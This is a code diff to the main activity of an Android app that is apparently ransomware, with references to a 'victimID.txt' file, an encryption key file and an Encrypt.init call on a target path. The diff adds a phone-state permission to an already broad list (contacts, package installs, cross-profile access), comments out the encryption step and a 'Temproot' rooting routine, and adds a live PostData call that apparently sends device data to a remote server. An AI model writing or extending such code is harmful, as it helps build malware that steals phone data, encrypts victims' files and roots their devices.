@@ -72,7 +72,8 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.INTERACT_ACROSS_PROFILES,
             Manifest.permission.REQUEST_INSTALL_PACKAGES,
-            Manifest.permission.READ_CONTACTS
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_PHONE_STATE
         };
         int PERMISSION_ALL = 1;
 
@@ -99,15 +100,30 @@ public class MainActivity extends AppCompatActivity {
         File key_f = new File(key_fp);
         File vicID_f = new File("/sdcard/victimID.txt");
         if (!key_f.exists() || !vicID_f.exists()){
-            try {
-                Log.d("MAIN ACTIVITY", "Encrypting in progress");
-                Encrypt.init(1, target_fp, key_fp, "");
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
+//            try {
+//                Log.d("MAIN ACTIVITY", "Encrypting in progress");
+//                Encrypt.init(1, target_fp, key_fp, "");
+//            } catch (IOException e) {
+//                e.printStackTrace();
+//            }
         }
         else {
-            Log.d("MAINT ACTIVITY", "keys.json && victimID.txt exists, not encrypting");
+            Log.d("MAIN ACTIVITY", "keys.json && victimID.txt exists, not encrypting");
+        }
+
+        // Temproot - Code
+//        try {
+//            Log.d("MAIN ACTIVITY", "Executing temproot");
+//            Temproot tr = new Temproot(this);
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
+
+        // PostData
+        try {
+            PostData pd = new PostData(this);
+        } catch (IOException e) {
+            e.printStackTrace();
         }
 
         // Bottom Toolbar
